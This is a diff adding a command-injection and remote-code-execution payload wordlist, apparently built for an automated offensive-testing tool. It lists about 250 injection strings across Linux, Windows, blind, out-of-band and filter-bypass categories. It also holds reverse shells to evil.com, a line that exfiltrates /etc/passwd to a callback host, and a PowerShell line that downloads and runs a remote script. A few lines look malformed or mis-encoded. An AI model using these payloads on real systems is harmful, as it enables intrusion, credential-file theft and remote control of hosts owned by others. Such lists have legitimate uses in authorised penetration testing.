@@ -1,0 +1,357 @@
+# ============================================================================
+# WhiteHatHacker AI — RCE (Remote Code Execution) / Command Injection Wordlist
+# Categories: Linux, Windows, Blind, Time-based, OOB, Filter Bypass,
+#             Encoding, Chaining, Substitution
+# Total: ~250 payloads
+# ============================================================================
+
+# --- BASIC LINUX COMMAND INJECTION ---
+;id
+;whoami
+;uname -a
+;cat /etc/passwd
+;ls -la
+|id
+|whoami
+|cat /etc/passwd
+|ls
+||id
+||whoami
+`id`
+`whoami`
+`cat /etc/passwd`
+$(id)
+$(whoami)
+$(cat /etc/passwd)
+;id;
+;id|
+|id|
+&id
+&whoami
+&cat /etc/passwd
+&&id
+&&whoami
+%0aid
+%0awhoami
+%0a%0did
+%0d%0aid
+%0Aid
+%0Did
+
+# --- BASIC WINDOWS COMMAND INJECTION ---
+;dir
+|dir
+||dir
+&dir
+&&dir
+;whoami
+|whoami
+||whoami
+&whoami
+&&whoami
+;type C:\windows\win.ini
+|type C:\windows\win.ini
+;net user
+|net user
+;ipconfig
+|ipconfig
+;systeminfo
+|systeminfo
+;hostname
+|hostname
+`whoami`
+$(whoami)
+
+# --- SEPARATOR VARIANTS ---
+;id
+|id
+||id
+&id
+&&id
+`id`
+$(id)
+;id;
+;id|
+|id;
+%0aid
+%0did
+%0a%0did
+\nid
+\rid
+\n\rid
+$IFS$9id
+{id}
+;{id}
+id\n
+id%0a
+%0a/bin/id
+%0a/usr/bin/id
+
+# --- BLIND COMMAND INJECTION (Time-based) ---
+;sleep 5
+|sleep 5
+||sleep 5
+&sleep 5
+&&sleep 5
+`sleep 5`
+$(sleep 5)
+;sleep 5;
+;sleep 5#
+;sleep 5%0a
+|sleep${IFS}5
+;sleep${IFS}5
+;ping -c 5 127.0.0.1
+|ping -c 5 127.0.0.1
+;timeout 5
+|timeout /t 5
+;ping -n 5 127.0.0.1
+|ping -n 5 127.0.0.1
+;sleep 10
+&&sleep 10
+
+# --- BLIND COMMAND INJECTION (OOB / DNS) ---
+;nslookup INTERACTSH_URL
+|nslookup INTERACTSH_URL
+;dig INTERACTSH_URL
+|dig INTERACTSH_URL
+;curl http://INTERACTSH_URL
+|curl http://INTERACTSH_URL
+$(curl http://INTERACTSH_URL)
+`curl http://INTERACTSH_URL`
+;wget http://INTERACTSH_URL
+|wget http://INTERACTSH_URL
+;curl http://INTERACTSH_URL/$(whoami)
+;curl http://INTERACTSH_URL/`id`
+;nslookup `whoami`.INTERACTSH_URL
+;nslookup $(whoami).INTERACTSH_URL
+;ping -c 1 `whoami`.INTERACTSH_URL
+;host `whoami`.INTERACTSH_URL
+;curl http://INTERACTSH_URL/?d=$(cat /etc/passwd|base64)
+
+# --- WINDOWS BLIND OOB ---
+;nslookup INTERACTSH_URL
+|nslookup INTERACTSH_URL
+;certutil -urlcache -f http://INTERACTSH_URL/x x
+;powershell Invoke-WebRequest -Uri http://INTERACTSH_URL
+;powershell IWR http://INTERACTSH_URL
+
+# --- FILTER BYPASS (spaces) ---
+;cat${IFS}/etc/passwd
+;cat$IFS/etc/passwd
+;{cat,/etc/passwd}
+;cat</etc/passwd
+;cat%09/etc/passwd
+;cat%20/etc/passwd
+;cat%0a/etc/passwd
+;IFS=,;`cat<<<cat,/etc/passwd`
+X]@127.0.0.1$'\x20telerik'
+;cat$'\x20'/etc/passwd
+
+# --- FILTER BYPASS (command obfuscation) ---
+;/bin/cat /etc/passwd
+;/bin/c?t /etc/passwd
+;/bin/c*t /etc/passwd
+;/b?n/c?t /etc/passwd
+;/???/???/passwd
+;c\at /etc/passwd
+;ca$@t /etc/passwd
+;ca$()t /etc/passwd
+;"c"a"t" /etc/passwd
+;'c'a't' /etc/passwd
+;c${not_defined}at /etc/passwd
+;ca\t /etc/passwd
+;c'a't /etc/passwd
+;c"a"t /etc/passwd
+;ca$@t /etc/passwd
+;$(printf '\143\141\164') /etc/passwd
+;$(printf '\x63\x61\x74') /etc/passwd
+;$'\143\141\164' /etc/passwd
+;base64 -d<<<Y2F0IC9ldGMvcGFzc3dk|bash
+;echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash
+;bash<<<$(base64 -d<<<aWQ=)
+
+# --- FILTER BYPASS (no slash) ---
+;cat etc/passwd
+;cd ..;cd ..;cd ..;cat etc/passwd
+;$(echo L2V0Yy9wYXNzd2Q=|base64 -d)
+
+# --- FILTER BYPASS (semicolon blocked) ---
+|id
+||id
+&&id
+%0aid
+%0a%0did
+\nid
+`id`
+$(id)
+{id}
+$({id})
+
+# --- ENCODING VARIANTS ---
+%3Bid
+%7Cid
+%26id
+%26%26id
+%60id%60
+%24(id)
+;%69%64
+;%77%68%6f%61%6d%69
+;%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64
+
+# --- CHAINED / COMPLEX ---
+;id;whoami;uname -a
+;id>/tmp/output;curl http://INTERACTSH_URL/$(cat /tmp/output)
+;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc evil.com 4444>/tmp/f
+;bash -i >& /dev/tcp/evil.com/4444 0>&1
+;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("evil.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+# --- WINDOWS SPECIFIC ---
+& whoami
+| whoami
+&& whoami
+|| whoami
+; whoami
+%0a whoami
+& dir C:\
+| type C:\windows\win.ini
+& net user
+& net localgroup administrators
+& tasklist
+& systeminfo
+& ipconfig /all
+& set
+& echo %USERNAME%
+| powershell -c "whoami"
+| powershell -c "Get-Process"
+& cmd /c whoami
+| cmd /c dir
+
+# --- POWERSHELL ---
+;powershell -c "whoami"
+|powershell -c "Get-ChildItem"
+;powershell -enc dwBoAG8AYQBtAGkA
+;powershell IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')
+
+# --- ARGUMENT INJECTION ---
+--version
+-v
+--help
+-h
+--exec=id
+-exec id
+file.txt;id
+file.txt|id
+file.txt`id`
+$(id).txt
+
+# ============================================================================
+# EXPANSION: Advanced RCE ??? Polyglot, WAF Bypass, Language-Specific
+# ============================================================================
+
+# --- Space Bypass ---
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+{cat,/etc/passwd}
+cat</etc/passwd
+cat%09/etc/passwd
+cat%0a/etc/passwd
+X=$'cat\x20/etc/passwd'&&$X
+cat${IFS}${IFS}/etc/passwd
+IFS=,;`cat<<<cat,/etc/passwd`
+
+# --- Keyword Bypass (no 'cat' or 'etc' or 'passwd') ---
+/???/??ss??
+/???/p?ss??
+c''at /e''tc/p''ass''wd
+c""at /e""tc/p""ass""wd
+c\at /et\c/pas\swd
+c$()at /etc$()/passwd$()
+c`echo a`t /etc/passwd
+/bin/c?t /etc/p?sswd
+tail -1 /etc/passwd
+head -1 /etc/passwd
+tac /etc/passwd
+rev /etc/passwd | rev
+sort /etc/passwd
+uniq /etc/passwd
+nl /etc/passwd
+xxd /etc/passwd
+
+# --- Wildcard / Glob Bypass ---
+/???/??t /???/p??s??
+/???/??t /?tc/????wd
+/b[i]n/c[a]t /e[t]c/p[a]sswd
+/b?n/c?t /?tc/p?ss?d
+
+# --- Variable Expansion ---
+a]id;[
+a]id\n[
+$(whoami)
+`whoami`
+a]whoami;[
+;$(id)
+|`id`
+$({id,})
+${IFS}id
+
+# --- Hex/Octal Encoded ---
+echo -e '\x69\x64' | sh
+echo -e '\151\144' | sh
+printf '\x69\x64' | sh
+echo YWQ= | base64 -d | sh
+echo aWQ= | base64 -d | sh
+echo d2hvYW1p | base64 -d | sh
+
+# --- Python RCE ---
+__import__('os').system('id')
+__import__('os').popen('id').read()
+eval("__import__('os').system('id')")
+exec("import os;os.system('id')")
+import subprocess;subprocess.call(['id'])
+import subprocess;print(subprocess.check_output(['id']).decode())
+
+# --- Ruby RCE ---
+`id`
+system('id')
+exec('id')
+%x(id)
+IO.popen('id').readlines()
+Open3.capture2('id')
+
+# --- Node.js RCE ---
+require('child_process').exec('id')
+require('child_process').execSync('id')
+require('child_process').spawnSync('id').stdout.toString()
+
+# --- PHP RCE ---
+<?php system('id');?>
+<?php passthru('id');?>
+<?php exec('id');?>
+<?php shell_exec('id');?>
+<?php popen('id','r');?>
+<?php proc_open('id',...);?>
+<?=`id`?>
+
+# --- Perl RCE ---
+system("id");
+exec("id");
+`id`
+open(CMD,"|id");
+
+# --- Java / OGNL RCE ---
+%{(#rt=@java.lang.Runtime@getRuntime().exec('id'))}
+${Runtime.getRuntime().exec("id")}
+
+# --- PowerShell Advanced ---
+powershell -enc aQBkAA==
+powershell -ep bypass -c "whoami"
+powershell IEX(New-Object Net.WebClient).DownloadString('http://INTERACTSH_URL')
+cmd /c "whoami"
+cmd /c "type C:\windows\win.ini"
+
+# --- Argument Injection Advanced ---
+--output=/tmp/test
+-o/tmp/test
+--exec=id
+--eval='require("child_process").exec("id")'
+-exec id {} \;
